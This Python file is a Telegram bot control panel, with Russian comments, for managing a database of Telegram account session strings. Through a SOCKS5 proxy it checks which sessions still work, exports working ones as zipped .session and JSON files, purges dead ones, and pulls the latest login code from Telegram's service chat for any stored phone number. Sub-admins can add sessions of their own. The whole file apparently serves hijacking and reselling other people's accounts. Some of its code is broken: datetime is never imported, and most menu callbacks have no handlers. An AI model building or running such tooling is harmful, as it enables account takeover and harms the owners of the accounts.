import os
import json
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from dotenv import load_dotenv
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from phonenumbers import parse, geocoder
from aiogram.dispatcher.middlewares import BaseMiddleware
from aiogram.dispatcher.handler import CancelHandler
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import zipfile
import tempfile

# Load .env
load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
PANEL_TOKEN = os.getenv("PANEL_BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
LA_ADMIN_IDS = json.loads(os.getenv("LA_ADMIN_IDS", "[]"))  # List of light admin IDs

PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]  # Main admin sessions
light_sessions_col = db["light_sessions"]  # Light admin sessions
light_admins_col = db["light_admins"]  # Light admin users

logging.basicConfig(level=logging.INFO)
bot = Bot(token=PANEL_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

def is_main_admin(uid):
    return uid == ADMIN_ID

def is_light_admin(uid):
    return uid in LA_ADMIN_IDS or light_admins_col.find_one({"user_id": uid}) is not None

class AccessControlMiddleware(BaseMiddleware):
    async def on_pre_process_message(self, message: types.Message, data: dict):
        user_id = message.from_user.id
        if not is_main_admin(user_id) and not is_light_admin(user_id):
            raise CancelHandler()

    async def on_pre_process_callback_query(self, callback_query: types.CallbackQuery, data: dict):
        user_id = callback_query.from_user.id
        if not is_main_admin(user_id) and not is_light_admin(user_id):
            raise CancelHandler()

dp.middleware.setup(AccessControlMiddleware())

# ================== COMMAND HANDLERS ==================

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    if is_main_admin(message.from_user.id):
        keyboard = InlineKeyboardMarkup(row_width=2).add(
            InlineKeyboardButton("✅ Check Sessions", callback_data='log'),
            InlineKeyboardButton("📂 Export Valids", callback_data='loger'),
            InlineKeyboardButton("🧹 Delete Invalid", callback_data='validel'),
            InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
            InlineKeyboardButton("📨 FA Bot History", callback_data='fa'),
            InlineKeyboardButton("👥 Manage Light Admins", callback_data='manage_la'),
            InlineKeyboardButton("🗑 Session Management", callback_data='session_management')
        )
        await message.answer("👑 Welcome, Main Admin! Choose an action:", reply_markup=keyboard)
    elif is_light_admin(message.from_user.id):
        keyboard = InlineKeyboardMarkup(row_width=2).add(
            InlineKeyboardButton("✅ Check My Sessions", callback_data='log'),
            InlineKeyboardButton("➕ Add Sessions", callback_data='addla'),
            InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
            InlineKeyboardButton("📨 FA Bot History", callback_data='fa'),
            InlineKeyboardButton("🗑 Session Management", callback_data='session_management')
        )
        await message.answer("🛡 Welcome, Light Admin. Choose an action:", reply_markup=keyboard)
    else:
        await message.answer("❌ You don't have access to use this bot.")

# ================== SESSION MANAGEMENT ==================

async def create_session_files(sessions, user_id):
    """Создает файлы сессий в формате JSON и .session"""
    temp_dir = tempfile.mkdtemp()
    zip_path = os.path.join(temp_dir, f"sessions_{user_id}.zip")
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for session in sessions:
            phone = session['phone'].replace('+', '')
            
            # Создаем JSON файл
            json_data = {
                "app_id": API_ID,
                "app_hash": API_HASH,
                "sdk": "Windows 10",
                "device": "Telegram Panel",
                "app_version": "5.16.4 x64",
                "lang_pack": "en",
                "system_lang_pack": "en-US",
                "twoFA": None,
                "id": session.get('user_id', 0),
                "phone": session['phone'],
                "username": session.get('username', ''),
                "is_premium": session.get('premium', False),
                "first_name": session.get('first_name', ''),
                "last_name": session.get('last_name', ''),
                "has_profile_pic": session.get('has_profile_pic', False),
                "session_file": phone,
                "session": session['session']
            }
            
            json_filename = f"{phone}.json"
            json_path = os.path.join(temp_dir, json_filename)
            with open(json_path, 'w') as f:
                json.dump(json_data, f, indent=2)
            zipf.write(json_path, json_filename)
            
            # Создаем .session файл
            session_filename = f"{phone}.session"
            session_path = os.path.join(temp_dir, session_filename)
            with open(session_path, 'w') as f:
                f.write(session['session'])
            zipf.write(session_path, session_filename)
            
            # Удаляем временные файлы
            os.unlink(json_path)
            os.unlink(session_path)
    
    return zip_path

@dp.message_handler(commands=['loger'])
async def cmd_loger(message: types.Message):
    """Экспорт всех валидных сессий в отдельных файлах"""
    if not is_main_admin(message.from_user.id):
        return await message.answer("❌ Not allowed.")

    await message.answer("🔍 Checking and exporting valid sessions...")

    sessions = list(sessions_col.find({}))
    valid_sessions = []
    
    for session in sessions:
        phone = session.get("phone")
        session_str = session.get("session")
        
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if await client.is_user_authorized():
                me = await client.get_me()
                valid_sessions.append({
                    "phone": phone,
                    "session": session_str,
                    "user_id": me.id,
                    "username": me.username,
                    "first_name": me.first_name,
                    "last_name": me.last_name,
                    "premium": getattr(me, 'premium', False),
                    "has_profile_pic": bool(getattr(me, 'photo', False))
                })
        except Exception as e:
            logging.error(f"Error checking session {phone}: {e}")
        finally:
            await client.disconnect()

    if not valid_sessions:
        return await message.answer("❌ No valid sessions found.")

    try:
        # Создаем архив с файлами сессий
        zip_path = await create_session_files(valid_sessions, message.from_user.id)
        
        # Отправляем архив пользователю
        with open(zip_path, 'rb') as zip_file:
            await message.answer_document(
                document=zip_file,
                caption=f"✅ Exported {len(valid_sessions)} valid sessions.\n\n"
                        "Each session includes:\n"
                        "- [phone].json - Session info in JSON format\n"
                        "- [phone].session - Session file for Telethon"
            )
        
        # Удаляем временные файлы
        os.unlink(zip_path)
        os.rmdir(os.path.dirname(zip_path))
        
    except Exception as e:
        logging.error(f"Error creating session files: {e}")
        await message.answer(f"❌ Error exporting sessions: {e}")

# ================== OTHER COMMANDS ==================

@dp.message_handler(commands=['log'])
async def cmd_log(message: types.Message):
    """Проверка всех сессий"""
    if is_main_admin(message.from_user.id):
        sessions = list(sessions_col.find({}))
        col_name = "MAIN"
    else:
        sessions = list(light_sessions_col.find({"owner_id": message.from_user.id}))
        col_name = f"LIGHT ADMIN {message.from_user.id}"
    
    if not sessions:
        return await message.answer("❌ No sessions found.")

    await message.answer(f"🔍 Checking {col_name} sessions...")
    
    results = []
    for session in sessions:
        phone = session.get("phone")
        session_str = session.get("session")
        
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                results.append(f"❌ {phone} — Invalid session")
            else:
                me = await client.get_me()
                country = geocoder.description_for_number(parse(phone, None), "en")
                premium = getattr(me, 'premium', False)
                blocked = bool(getattr(me, 'restriction_reason', []))
                results.append(
                    f"✅ {phone} | ID: {me.id} | {country} | "
                    f"Premium: {'Yes' if premium else 'No'} | "
                    f"Blocked: {'Yes' if blocked else 'No'}"
                )
        except Exception as e:
            results.append(f"❌ {phone} — Error: {e}")
        finally:
            await client.disconnect()

    text = "\n".join(results)
    for chunk in [text[i:i+4000] for i in range(0, len(text), 4000)]:
        await message.answer(chunk)

@dp.message_handler(commands=['validel'])
async def cmd_validel(message: types.Message):
    """Удаление невалидных сессий"""
    if not is_main_admin(message.from_user.id):
        return await message.answer("❌ Not allowed.")

    sessions = list(sessions_col.find({}))
    deleted = 0
    
    for session in sessions:
        client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                sessions_col.delete_one({"_id": session["_id"]})
                deleted += 1
        except:
            sessions_col.delete_one({"_id": session["_id"]})
            deleted += 1
        finally:
            await client.disconnect()

    await message.answer(f"🧹 Invalid sessions removed: {deleted}")

@dp.message_handler(commands=['login'])
async def cmd_login(message: types.Message):
    """Получение кода входа из Telegram"""
    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
        return

    args = message.get_args().strip()
    if not args.startswith('+'):
        return await message.reply("❗️ Use format: /login +1234567890")

    if is_main_admin(message.from_user.id):
        session = sessions_col.find_one({"phone": args})
    else:
        session = light_sessions_col.find_one({"phone": args, "owner_id": message.from_user.id})
    
    if not session:
        return await message.reply("❌ Session not found.")

    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
    try:
        await client.connect()
        history = await client(GetHistoryRequest(
            peer=777000, 
            limit=1, 
            offset_date=None,
            offset_id=0, 
            max_id=0, 
            min_id=0, 
            add_offset=0, 
            hash=0
        ))
        
        if history.messages:
            await message.reply(
                f"📨 Last Telegram code for {args}:\n\n"
                f"`{history.messages[0].message}`", 
                parse_mode="Markdown"
            )
        else:
            await message.reply("⚠️ No messages from Telegram.")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")
    finally:
        await client.disconnect()

# ================== LIGHT ADMIN MANAGEMENT ==================

@dp.callback_query_handler(lambda c: c.data == 'manage_la')
async def manage_light_admins(callback_query: types.CallbackQuery):
    """Управление легкими админами"""
    if not is_main_admin(callback_query.from_user.id):
        return await callback_query.answer("❌ Not allowed.")

    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("➕ Add Light Admin", callback_data='add_light_admin'),
        InlineKeyboardButton("➖ Remove Light Admin", callback_data='remove_light_admin'),
        InlineKeyboardButton("📋 List Light Admins", callback_data='list_light_admins')
    )
    
    await bot.send_message(
        callback_query.from_user.id,
        "👥 Light Admins Management:",
        reply_markup=keyboard
    )
    await callback_query.answer()

@dp.message_handler(commands=['add_la'])
async def add_light_admin_cmd(message: types.Message):
    """Добавление легкого админа"""
    if not is_main_admin(message.from_user.id):
        return

    try:
        user_id = int(message.get_args().strip())
        user = await bot.get_chat(user_id)
        
        light_admins_col.update_one(
            {"user_id": user_id},
            {"$set": {
                "user_id": user_id, 
                "username": user.username,
                "added_by": message.from_user.id,
                "added_date": datetime.now()
            }},
            upsert=True
        )
        
        await message.reply(
            f"✅ Added light admin: {user_id} (@{user.username})\n"
            f"Now they can add their own sessions."
        )
    except Exception as e:
        await message.reply(f"❌ Error: {e}")

# ================== MAIN LOOP ==================

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)